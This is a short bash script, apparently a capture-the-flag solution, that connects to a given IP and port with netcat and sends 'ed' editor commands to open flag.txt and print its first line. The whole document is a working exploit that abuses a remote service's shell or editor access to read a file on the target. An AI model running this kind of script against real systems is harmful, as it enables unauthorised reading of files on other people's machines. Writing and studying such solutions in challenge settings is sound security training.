#!/usr/bin/env bash

ip=$1
port=$2

echo -ne "ed\ne flag.txt\n1p\nq\n" | nc "${ip}" "${port}"
